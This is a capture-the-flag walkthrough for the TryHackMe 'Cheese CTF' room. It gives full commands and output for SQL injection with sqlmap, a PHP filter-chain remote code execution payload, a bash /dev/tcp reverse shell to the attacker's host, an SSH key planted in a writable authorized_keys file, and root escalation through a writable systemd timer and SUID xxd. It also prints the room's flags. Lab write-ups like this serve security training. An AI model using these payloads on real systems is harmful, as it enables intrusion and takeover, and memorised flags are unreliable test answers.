| Category          | Details                                                                                     |
|-------------------|---------------------------------------------------------------------------------------------|
| 📝 **Name**       | [Cheese CTF](https://tryhackme.com/room/cheesectfv10)                                       |  
| 🏷 **Type**       | THM Challenge                                                                               |
| 🖥 **OS**         | Linux                                                                                       |
| 🎯 **Difficulty** | Easy                                                                                        |
| 📁 **Tags**       | Port spoofing, SQLi, LFI, php:// wrappers, PHP filter gadget chain, Systemd timer, suid xxd |

## Task 2: Flags

### What is the user.txt flag?

#### Scan target with `nmap`
`nmap` scan returns huge amounts of open ports and 50 first of them (w/o SSH) prints a troll face.
```
┌──(magicrc㉿perun)-[~/attack/THM Cheese CTF]
└─$ for port in {1..50}; do [[ $port -eq 22 ]] && continue; printf "%2d: " "$port"; nc $TARGET $port; echo ""; done
 1: 550 12345 0000000000000000000000000000000000000000000000000000000
 2: 550 12345 0000000000000000000000000000000000000000000000000000000
 3: 550 12345 0000000000000000000000000000000000000000000000000000000
 4: 550 12345 0000000000000000000000000000000000000000000000000000000
 5: 550 12345 0000000000000000000000000000000000000000000000000000000
 6: 550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff00
 7: 550 12345 0fffffffffffff777778887777777777cffffffffffffffffffff00
 8: 550 12345 0fffffffffff8000000000000000008888887cfcfffffffffffff00
 9: 550 12345 0ffffffffff80000088808000000888800000008887ffffffffff00
10: 550 12345 0fffffffff70000088800888800088888800008800007ffffffff00
11: 550 12345 0fffffffff000088808880000000000000088800000008fffffff00
12: 550 12345 0ffffffff80008808880000000880000008880088800008ffffff00
13: 550 12345 0ffffffff000000888000000000800000080000008800007fffff00
14: 550 12345 0fffffff8000000000008888000000000080000000000007fffff00
15: 550 12345 0ffffff70000000008cffffffc0000000080000000000008fffff00
16: 550 12345 0ffffff8000000008ffffff007f8000000007cf7c80000007ffff00
17: 550 12345 0fffff7880000780f7cffff7800f8000008fffffff80808807fff00
18: 550 12345 0fff78000878000077800887fc8f80007fffc7778800000880cff00
19: 550 12345 0ff70008fc77f7000000f80008f8000007f0000000000000888ff00
20: 550 12345 0ff0008f00008ffc787f70000000000008f000000087fff8088cf00
21: 550 12345 0f7000f800770008777000000000000000f80008f7f70088000cf00
23: 550 12345 0f8008707ff07ff8000008088ff800000000f7000000f800808ff00
24: 550 12345 0f7000f888f8007ff7800000770877800000cf780000ff00807ff00
25: 550 12345 0ff0808800cf0000ffff70000f877f70000c70008008ff8088fff00
26: 550 12345 0ff70800008ff800f007fff70880000087f70000007fcf7007fff00
27: 550 12345 0fff70000007fffcf700008ffc778000078000087ff87f700ffff00
28: 550 12345 0ffffc000000f80fff700007787cfffc7787fffff0788f708ffff00
29: 550 12345 0fffff7000008f00fffff78f800008f887ff880770778f708ffff00
30: 550 12345 0ffffff8000007f0780cffff700000c000870008f07fff707ffff00
31: 550 12345 0ffffcf7000000cfc00008fffff777f7777f777fffffff707ffff00
32: 550 12345 0cccccff0000000ff000008c8cffffffffffffffffffff807ffff00
33: 550 12345 0fffffff70000000ff8000c700087fffffffffffffffcf808ffff00
34: 550 12345 0ffffffff800000007f708f000000c0888ff78f78f777c008ffff00
35: 550 12345 0fffffffff800000008fff7000008f0000f808f0870cf7008ffff00
36: 550 12345 0ffffffffff7088808008fff80008f0008c00770f78ff0008ffff00
37: 550 12345 0fffffffffffc8088888008cffffff7887f87ffffff800000ffff00
38: 550 12345 0fffffffffffff7088888800008777ccf77fc777800000000ffff00
39: 550 12345 0fffffffffffffff800888880000000000000000000800800cfff00
40: 550 12345 0fffffffffffffffff70008878800000000000008878008007fff00
41: 550 12345 0fffffffffffffffffff700008888800000000088000080007fff00
42: 550 12345 0fffffffffffffffffffffc800000000000000000088800007fff00
43: 550 12345 0fffffffffffffffffffffff7800000000000008888000008ffff00
44: 550 12345 0fffffffffffffffffffffffff7878000000000000000000cffff00
45: 550 12345 0ffffffffffffffffffffffffffffffc880000000000008ffffff00
46: 550 12345 0ffffffffffffffffffffffffffffffffff7788888887ffffffff00
47: 550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff00
48: 550 12345 0000000000000000000000000000000000000000000000000000000
49: 550 12345 0000000000000000000000000000000000000000000000000000000
50: 550 12345 0000000000000000000000000000000000000000000000000000000
```
Which effectively means we can not relay on `nmap` results need to 'blindly' enumerate common ports.

#### Check if HTTP server is running on port 80
```
┌──(magicrc㉿perun)-[~/attack/THM Cheese CTF]
└─$ curl -I http://$TARGET       
HTTP/1.1 200 OK
Date: Sun, 21 Dec 2025 10:03:42 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Sun, 10 Sep 2023 12:55:38 GMT
ETag: "6df-60500b9f14680"
Accept-Ranges: bytes
Content-Length: 1759
Vary: Accept-Encoding
Content-Type: text/html
```

#### Discover `Login Page`
```
┌──(magicrc㉿perun)-[~/attack/THM Cheese CTF]
└─$ curl -I http://$TARGET/login.php                                  
HTTP/1.1 200 OK
Date: Sun, 21 Dec 2025 10:17:52 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
```

#### Enumerate `login.php` with `sqlmap`
Raw HTTP request has been obtained with `Burp Suite`.
```
{ cat <<'EOF'> login.http
POST /login.php HTTP/1.1
Host: 10.82.141.16
Content-Length: 30
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.82.141.16
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.82.141.16/login.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

username=admin&password=pass
EOF
} && sqlmap -r login.http --batch --level 5
<SNIP>
[11:23:39] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided risk (1) value? [Y/n] Y
[11:23:39] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[11:23:39] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
got a 302 redirect to 'http://10.82.141.16/secret-script.php?file=supersecretadminpanel.html'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N
[11:23:40] [INFO] target URL appears to be UNION injectable with 3 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[11:23:43] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[11:23:43] [INFO] testing 'Generic UNION query (47) - 21 to 40 columns'
[11:23:45] [INFO] testing 'Generic UNION query (47) - 41 to 60 columns'
[11:23:46] [INFO] testing 'Generic UNION query (47) - 61 to 80 columns'
[11:23:47] [INFO] testing 'Generic UNION query (47) - 81 to 100 columns'
[11:23:48] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 2557 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 4039 FROM (SELECT(SLEEP(5)))KJYE)-- RrqV&password=pass
---
[11:24:42] [INFO] the back-end DBMS is MySQL
[11:24:42] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
web server operating system: Linux Ubuntu 19.10 or 20.10 or 20.04 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
<SNIP>
```
`sqlmap` has discovered SQLi in `username` HTTP parameter and also during enumeration it has been redirected to `/secret-script.php?file=supersecretadminpanel.html`.

#### Discover `secret-script.php` accepts `php://` wrapper in `file` parameter
```
┌──(magicrc㉿perun)-[~/attack/THM Cheese CTF]
└─$ curl http://$TARGET/secret-script.php?file=php://filter/resource=supersecretmessageforadmin
If you know, you know :D
```
We could exploit this vulnerability as LFI and then try to RCE via logs poisoning, but since `php://` is accepted we could use PHP Filter Gadget Chain technique.

#### Generate `system($_GET[1]);` PHP filter gadget chain
```
┌──(magicrc㉿perun)-[~/attack/THM Cheese CTF]
└─$ export GADGET_CHAIN=$(python3 ~/Tools/php_filter_chain_generator/php_filter_chain_generator.py --chain '<?php system($_GET[1]); ?>' | tail -n 1) && \
echo $GADGET_CHAIN
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

#### Test generated gadget chain
```
┌──(magicrc㉿perun)-[~/attack/THM Cheese CTF]
└─$ curl 'http://'${TARGET}'/secret-script.php?1=id&file='${GADGET_CHAIN}'' --output -
uid=33(www-data) gid=33(www-data) groups=33(www-data)
�
P�������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@
```

#### Start `netcat` to listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/THM Cheese CTF]
└─$ nc -lvnp 4444                                              
listening on [any] 4444 ...
```

#### Spawn reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/THM Cheese CTF]
└─$ CMD=$(echo "/bin/bash -c 'bash -i >& /dev/tcp/192.168.132.170/4444 0>&1'" | jq -sRr @uri)
curl 'http://'${TARGET}'/secret-script.php?1='${CMD}'&file='${GADGET_CHAIN}'' --output -
```

#### Confirm foothold gained
```
connect to [192.168.132.170] from (UNKNOWN) [10.82.141.16] 47668
bash: cannot set terminal process group (931): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-82-141-16:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Discover write permissions to `/home/comte/.ssh/authorized_keys`
```
www-data@ip-10-82-141-16:/var/www/html$ ls -la /home/comte/.ssh
ls -la /home/comte/.ssh
total 8
drwxr-xr-x 2 comte comte 4096 Mar 25  2024 .
drwxr-xr-x 7 comte comte 4096 Apr  4  2024 ..
-rw-rw-rw- 1 comte comte    0 Mar 25  2024 authorized_keys
```
This permission has been discovered with `linpeas.sh`.

#### Generate locally SSH key pair
```
┌──(magicrc㉿perun)-[~/attack/THM Cheese CTF]
└─$ ssh-keygen -t ed25519 -f cheese -N "" && cat cheese.pub
Generating public/private ed25519 key pair.
Your identification has been saved in cheese
Your public key has been saved in cheese.pub
The key fingerprint is:
SHA256:vYav/3gZ31V7a9KJ1WzwvAk8u+tuO207TB76SF5F0/U magicrc@perun
The key's randomart image is:
+--[ED25519 256]--+
|                .|
|                +|
|               .E|
|         .    ..o|
|        S . .  ==|
|         . ..+ =X|
|        . o  =&+O|
|         o .=B+&.|
|        .o+o=OXoo|
+----[SHA256]-----+
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMTMvHUkXqXfwyEIy0GiFGG3tlpY4J1rEbksd/3yABFi magicrc@perun
```

#### Append generated SSH public key to `/home/comte/.ssh/authorized_keys`
```
www-data@ip-10-82-141-16:/var/www/html$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMTMvHUkXqXfwyEIy0GiFGG3tlpY4J1rEbksd/3yABFi magicrc@perun' >> /home/comte/.ssh/authorized_keys
< magicrc@perun' >> /home/comte/.ssh/authorized_keys
```

#### Upgrade reverse shell connection to SSH
```
┌──(magicrc㉿perun)-[~/attack/THM Cheese CTF]
└─$ ssh -i cheese comte@$TARGET
<SNIP>
comte@ip-10-82-141-16:~$ id
uid=1000(comte) gid=1000(comte) groups=1000(comte),24(cdrom),30(dip),46(plugdev)
```

#### Captrue user flag
```
comte@ip-10-82-141-16:~$ cat /home/comte/user.txt | grep THM
THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}
```

### What is the root.txt flag?

#### List allowed sudo commands
```
comte@ip-10-82-141-16:~$ sudo -l
User comte may run the following commands on ip-10-82-141-16:
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
```
We can see that user `comte` can fully control Systemd `exploit` timer.

#### Check `exploit.service`
```
comte@ip-10-82-141-16:~$ cat /etc/systemd/system/exploit.service 
[Unit]
Description=Exploit Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
```
We can see that this service creates SUID version `xxd` in `/opt/xxd` with which we could read / write any file in the system.

#### Check `[Timer]` section of `exploit.timer`
```
comte@ip-10-82-141-16:~$ cat /etc/systemd/system/exploit.timer 
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=

[Install]
WantedBy=timers.target
```
Since `[Timer]` is empty it starting `exploit.timer` will not yield any results.

#### Check write permission `/etc/systemd/system/exploit.timer`
```
comte@ip-10-82-141-16:~$ ls -l /etc/systemd/system/exploit.timer && lsattr /etc/systemd/system/exploit.timer
-rwxrwxrwx 1 root root 87 Mar 29  2024 /etc/systemd/system/exploit.timer
--------------e----- /etc/systemd/system/exploit.timer
```
With write permissions we could overwrite `/etc/systemd/system/exploit.timer` so it runs every minute.

#### Use `exploit` timer to create SUID `xxd`
```
{ cat <<'EOF' > /etc/systemd/system/exploit.timer
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=1min
OnUnitActiveSec=1min

[Install]
WantedBy=timers.target
EOF
} && sudo /bin/systemctl enable exploit.timer && sudo /bin/systemctl start exploit.timer
```

#### Confirm SUID `xxd` has been created
```
comte@ip-10-82-141-16:~$ ls -l /opt
total 20
-rwsr-sr-x 1 root root 18712 Dec 21 11:35 xxd
```

#### Capture root flag
```
comte@ip-10-82-141-16:~$ /opt/xxd /root/root.txt | xxd -r | grep THM
THM{dca75486094810807faf4b7b0a929b11e5e0167c}
```
